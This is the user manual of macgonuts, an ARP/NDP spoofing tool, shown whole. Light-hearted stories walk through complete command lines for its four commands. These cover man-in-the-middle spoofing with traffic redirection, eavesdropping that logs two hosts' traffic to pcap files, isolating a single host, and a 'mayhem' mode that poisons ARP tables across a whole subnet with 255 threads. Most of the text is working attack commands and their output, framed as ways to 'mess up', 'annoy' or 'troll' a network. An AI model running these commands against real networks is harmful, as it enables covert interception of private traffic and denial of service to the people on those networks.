# Macgonuts user's manual

**Abstract**: This document provides information about how to use all features currently implemented on
``macgonuts`` tool. Any unclear or even untreated topic you can report
[here](https://github.com/rafael-santiago/macgonuts/issues) please and, thank you!

## Topics

- [What does ``macgonuts`` is for?](#what-does-macgonuts-is-for)
- [Basic facts about the command line tool](#basic-facts-about-the-command-line-tool)
- [Commands](#commands)
    - [The spoof command](#the-spoof-command)
    - [The eavesdrop command](#the-eavesdrop-command)
    - [The isolate command](#the-isolate-command)
    - [The mayhem command](#the-mayhem-command)

## What does ``macgonuts`` is for?

Besides a lousy pun, ``macgonuts`` is also a tool to exploit address resolution on networks.
Anyway, the main motivation to implement ``macgonuts`` was the possibility of using the lousy pun, I need to admit...
You can also understand ``macgonuts`` as a swiss army knife to exploit addressing resolution on computer networks, but
my main goal was to have something to use the pun.

[``Back``](#topics)

## Basic facts about the command line tool

1. This is about a ``unix-like`` tool.
2. It does not set on fireworks when a thing works.
3. It is based on commands.
4. When you want a quick help about a command you run: ``macgonuts help <command>``.
5. If you do not want to read this manual by preferring poke the tool by yourself: ``macgonuts help``.
6. If you still do not understand try to go to 1 (repeat it some couple of times).
7. Open an issue asking me about, thank you for helping me to improve on the documentation! :wink:

[``Back``](#topics)

## Commands

This section describes in details all implemented commands in ``macgonuts``. Keep on reading to master up
the tool and making a youtube video about it (because I do not have any talent or even patience to do this),
many thanks in advance!

### The spoof command

Maybe the ``spoof`` command is the command for what you arrived here. With ``spoof`` command you can deceive
a host by making it think that you are the droid that it was looking for...

If you run:

```
ford@RestaurantAtTheEndOfTheUniverse:~# macgonuts help spoof
use: macgonuts spoof --lo-iface=<label>
                     --target-addr=<ip4|ip6> --addr2spoof=<ip4|ip6>
                    [--fake-pkts-amount=<n> --timeout=<ms> --redirect --undo-spoof]
```

Okay, it expects at least three options:

- ``lo-iface``
- ``target-addr``
- ``addr2spoff``

Nice, it does support ``ARP`` and ``NDP`` because options related to addressing supports ``ipv4`` or ``ipv6``.

The option ``lo-iface`` stands for "local interface" you need to indicate the interface that your
machine uses to access the network that you are wanting to.. err... mess up... Anyway,
the option ``target-addr`` is where you indicate the address of the host that you want to deceive
and ``addr2spoof`` option is where you input the address that you want to override in target host system.

Now, story time!!!!!!

Once upon time, three persons: Alice, Bob and Eve:

- Alice is on host ``192.30.70.8``.
- Bob is on host ``192.30.70.10``.
- Eve is on host ``192.30.70.9``.

Eve wants to use ``macgonuts`` to make Bob thinks that she is Alice on the network. So Eve run:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8
```

After emitting this command on her terminal, Eve starts to watch the following messages:

```
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
info: ARP reply -> `192.30.70.10`, MAC `08:00:27:e5:9b:4a` will override `08:00:27:97:64:91` at `192.30.70.10`.
(...)
```

Eve's screen will be flooded with this info, now you imagine the network... Eve the barbarian I would say...
In fact, the spoof is done, at this moment ``192.30.70.10`` (Bob) thinks that ``192.30.70.8`` (Alice) is
``192.30.70.9`` (Eve).

If Eve wants to avoid flooding the network with so many packets she can pass ``timeout=<mss>`` option:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8 --timeout=500
```

The same effect of the prior command but now at each half second ``macgonuts`` will inject in the network one
fake ``ARP`` resolution.

Nice, but Eve also wants to avoid interrupting any communication between ``Alice <-> Bob``, in this way she can sit on
and eavesdropping (what a nice pun, huh?!) their channel. It can be done by passing ``redirect`` flag:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8 --timeout=500 --redirect
```

Same effect, still spoofed but now redirecting packets and do not abusing network throughput.

Eve hits ``ctrl+c`` to exit the application (by the way, this is how you exit spoof command, sorry!). However,
Bob still thinks that Eve's computer is Alice's computer and at this moment he will notice that "Alice"
stopped respond to his requests. If Eve wants to become incognito, she can pass the option ``--undo-spoof``:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8 --timeout=500 --redirect --undo-spoof
```

Once ``macgonuts`` got an exit request it will stop flooding network with fake packets and
restore the ``MAC`` resolution on target host, in other words, it does some housekeeping before going home
(...well, I think you understood).

If flooding network is not an option Eve also could send only a specific amount of fake resolution
packets by using ``fake-pkts-amount=<n>``:

```
eve@RestaurantAtTheEndOfTheUniverse:~# macgonuts spoof --lo-iface=eth1 \
> --target-addr=192.30.70.10 --addr2spoof=192.30.70.8 --timeout=3000 --fake-pkts-amount=50
> --redirect --undo-spoof
```

**Tip**: When you do redirect it has already some implicit timeout, thus, maybe you do not have to pass an
explicit timeout, depending on how much of timeout you are intending between fake resolution packets.

Congrats! Now you are a macgonuts spoofing master!

[``Back``](#topics)

### The eavesdrop command

If you are wanting to do some active sniffing between two points this is the ``macgonuts`` command that you are
looking for...

With ``eavesdrop`` command you are able to simply watch the network traffic or log it to inspect later. You can
also inform to ``macgonuts`` what content is relevant to be displayed/logged.

When you ask for ``eavesdrop``'s help you will be presented to something like the following:

```
joshua@FarEastForTheTrees:~# macgonuts help eavesdrop
use: macgonuts eavesdrop --lo-iface=<label>
                         --alice-addr=<ip4|ip6> --bob-addr=<ip4|ip6>
                        [--pcap-file=<path> --file=<path> --filter-globs=<glob_0,...,glob_n> --undo-spoof]
```

So... Story time!!!!!!

Once upon time Alice and Bob, they were communicating each other by using the local network but they were
in different network segments! Connected through switches! In order to avoid Eve of doing passive sniffing, bad girl!

Eve, after some evil laughs (``- MuHahuahuahuAH...``, ``- Muhahauahuahau...``) however, she was using ``macgonuts``
that has btw her favorite command that is able to deceive bridged/segmented networks when sniffing (Well, I love puns,
I have to admit).

All Eve needed to do was:

```
eve@FarEastForTheTrees:~# macgonuts eavesdrop --lo-iface=eth1 \
> --alice-addr=192.30.70.11 --bob-addr=192.30.70.12
```

After that, all what the two talked each other begun be displayed at Eve's screen. Bang!

Nevertheless, in thruth, Eve was not the villain here, she was a ``sysadmin`` seeking to catch network abuses done by
Alice and Bob. So, Eve decided to log all them traffic to use it later as proofs:

```
eve-the-sysadmin-with-lasers@FarEastForTheTrees:~# macgonuts eavesdrop --lo-iface=eth1 \
> --alice-addr=192.30.70.11 --bob-addr=192.30.70.12 --file=log-them-tender-log-them-switch.log
```

Now everything that would be dumped to screen was dumped to the indicated file path (if the file has already existed
it would be appended to it).

Anyway, Eve wants to inspect more deeply the packet contents with other tools of her choice. So Eve decided
to log all traffic by using ``pcap`` format, a format well understood among so many traffic analyzing tools:

```
eve-the-sysadmin-with-lasers@Tender:~# macgonuts eavesdrop --lo-iface=eth1 \
> --alice-addr=192.30.70.11 --bob-addr=192.30.70.12 --pcap-file=log-them-tender-log-them-switch.pcap

```

Eve is a good professional, she wants to gather proofs of them abuse, give it to her superior and let
she decided what to do so. Thus, by now Eve does not want to warn Alice neither Bob. In this way, she
uses ``undo-spoof`` to let them communicating each other even after her logging session has finished:

```
eve-the-sysadmin-with-lasers-and-very-silent@Tender:~# macgonuts eavesdrop --lo-iface=eth1 \
> --alice-addr=192.30.70.11 --bob-addr=192.30.70.12 --pcap-file=log-them-tender-log-them-switch.pcap \
> --undo-spoof

```

Opposingly what all crypto folks tend to think, Eve respect privacy issues, so she decided to use a filter to
log only what should be abuses on her cooporative network environment:

```
eve-the-sysadmin-with-lasers-and-very-silent@Tender:~# macgonuts eavesdrop --lo-iface=eth1 \
> --alice-addr=192.30.70.11 --bob-addr=192.30.70.12 --pcap-file=log-them-tender-log-them-switch.pcap \
> --filter-globs=*xxx.org*,*\x03xxx\x3org*,*[Rr][Ii][Cc][Kk][Rr][Oo][Ll]* --undo-spoof

```

As you can see ``filter-globs`` option supports extended asciis by passing its values as hexadecimal
numbers in form ``\xXX``. The glob supports the classical wildcards: star (``*``), question (``?``) and
groups (``[...]``). It is also possible to pass longer hexadecimal streams, e.g: ``\x45007238123731627320``.

Congrats again! Welcome to the paradise, now you are a macgonuts eavesdrop master.

[``Back``](#topics)

### The isolate command

With isolate command it is possible to make a specific host an island. Any contact done from anyone in the
local network will be "cut off" by isolating this target node.

If you ask the quick help from isolate you will get the following:

```
robinson@SomewhereInTheCoastOfAmerica:~# macgonuts help isolate
use: macgonuts isolate --lo-iface=<label> --isle-addr=<ip4|ip6>
                      [ --no-route-to=<ip4|ip6|cidr4|cidr6 list> --fake-pkts-amount=<n> ]

```

This command has two required options ``lo-iface`` and ``isle-addr``. In ``lo-iface`` option you
have to inform the network interface that you use to access the network. In ``isle-addr`` you
have to inform the address that you are intending to isolate.

So, story time!!!!

Once upon time, Robinson was seeking to troll your beloved friend John by making his workstation an island.
Robinson was using ``eth1`` to access the network and his friend John grabbed the address ``192.30.70.8``:

```
robinson@SomewhereInTheCoastOfAmerica:~# macgonuts isolate --lo-iface=eth1 --isle-addr=192.30.70.8
```

Once he ran this command, ``macgonuts`` started on sniffing the network for packets with destination
to John's host. At the moment that ``macgonuts`` detects a single packet flow, it has cut off the
communication between them by fuddling the John's ``ARP`` table.

By default macgonuts will send only one fake ``MAC`` resolution packet, anyway, if Robinson
wanted to flood John with more, Robinson could be used ``fake-pkts-amount`` option:

```
robinson@SomewhereInTheCoastOfAmerica:~# macgonuts isolate --lo-iface=eth1 --isle-addr=192.30.70.8 \
> --fake-pkts-amount=4096
```

Robinson also could be defined specific host(s) that the communication should be cut off, by using
the option ``no-route-to``:

```
robinson@SomewhereInTheCoastOfAmerica:~# macgonuts isolate --lo-iface=eth1 --isle-addr=192.30.70.8 \
> --no-route-to=192.30.70.7,192.30.70.9
```

It is also possible to inform ``CIDR``s on it:

```
robinson@SomewhereInTheCoastOfAmerica:~# macgonuts isolate --lo-iface=eth1 --isle-addr=192.30.70.8 \
> --no-route-to=192.30.70.0/4,192.30.70.60
```

In this case all between ``192.30.70.0-192.30.70.15`` and ``192.30.70.60`` will be unreachable from
John's host (``192.30.70.8``).

Congrats! Now you are a macgonuts troll master by knowing every single thing about isolate command!

[``Back``](#topics)

### The mayhem command

If you are only seeking to annoy a network as whole, maybe the mayhem command is the command for you.
With mayhem you are able to make ARP/Neighbor tables a total mess. As a result the host will be unable
to communicate each other or at least unable to communicate each other without unstability.

In order to work on this command needs three basic options: the local interface, a CIDR and a list of
targets.

So, story time!!!!

Once upon time, Mallory. This nice person was wanting to interfere with communication of Alice, Bob and Eve.
Alice was at host ``192.30.70.8``, Bob at host ``192.30.70.9`` and Eve at host ``192.30.70.10``. However,
the three have been keeping communication with other hosts that compound the network, too. This network
was a class C network, so the net mask was ``255.255.255.0``.

Mallory has been poking a little ``macgonuts`` these days and decided give ``mayhem`` command a try:

```
malory@SearchAndDestroy:~# macgonuts help mayhem
use: macgonuts mayhem --lo-iface=<label>
                      --no-route-range=<cidr4|cidr6>
                      --target-addrs=<ip4|ip6|cidr4|cidr6 list>
                     [--fake-pkts-amount=<n> --timeout=<ms> --spoof-threads=<n>]

```

Nice, Mallory was accessing her network from ``eth1``, since ``no-route-range`` expects a CIDR and
her network is a class C network, it does mean that this network uses 24 bits of the ip to identify
the network, so ``no-route-range`` needs to be ``192.30.70.0/24``. Any host into this range should
become unreachable by all targets specified in ``target-addrs`` option, again, ``192.30.70.8``,
``192.30.70.9`` and ``192.30.70.10`` a.k.a. Alice, Bob and Eve. Look:

```
malory@SearchAndDestroy:~# macgonuts mayhem --lo-iface=eth1 --no-route-range=192.30.70.0/24 \
> --target-addrs=192.30.70.8,192.30.70.9,192.30.70.10
```

After running the command above the network will become infested of fake ARP resolution packets.
The ARP tables of Alice, Bob and Eve have become bloated with fuzzy information. Taking all the
three straight to nowhere.

Nevertheless the command above is still a little bit well behaved since it will use only one thread to
do the spoofing task, that is a little bit demanding in terms of work load. Maybe Mallory should
give ``spoof-threads`` option a try:

```
malory@SearchAndDestroy:~# macgonuts mayhem --lo-iface=eth1 --no-route-range=192.30.70.0/24 \
> --target-addrs=192.30.70.8,192.30.70.9,192.30.70.10 --spoof-threads=255
```

Great! Now the act of spoofing all no-route range to each target is almost instant,
since we have 255 threads sending in parallel the fake ARP replys, because
this network has only 255 possible nodes, well 253 technically (0 is network address and
255 the broadcast).

Mallory also could defined a timeout when sending out those fake MAC resolution packets by using
``timeout`` option:

```
malory@SearchAndDestroy:~# macgonuts mayhem --lo-iface=eth1 --no-route-range=192.30.70.0/24 \
> --target-addrs=192.30.70.8,192.30.70.9,192.30.70.10 --spoof-threads=255 --timeout=100
```

Yes, this is also expressed in milliseconds. It could be also possible to set a total of
fake resolution packets to each node present in no-route range:

```
malory@SearchAndDestroy:~# macgonuts mayhem --lo-iface=eth1 --no-route-range=192.30.70.0/24 \
> --target-addrs=192.30.70.8,192.30.70.9,192.30.70.10 --spoof-threads=255 --timeout=100 \
> --fake-pkts-amount=20
```

The default of this option is just one per host.

Okay, but what about mess with the whole nodes? MuAhAUHAuAHAUAhUAhAUHAUha... Simple:

```
malory@SearchAndDestroy:~# macgonuts mayhem --lo-iface=eth1 --no-route-range=192.30.70.0/24 \
> --target-addrs=192.30.70.0/24 --spoof-threads=255 --timeout=100 \
> --fake-pkts-amount=20
```

See? ``target-addrs`` supports CIDRs so just defining the exact CIDR of the current network
will make the whole network nodes potential targets.

Congrats! Now you are a layer-2 disorder master by knowing every single detail about
``macgonuts mayhem`` command, bad cat!

[``Back``](#topics)
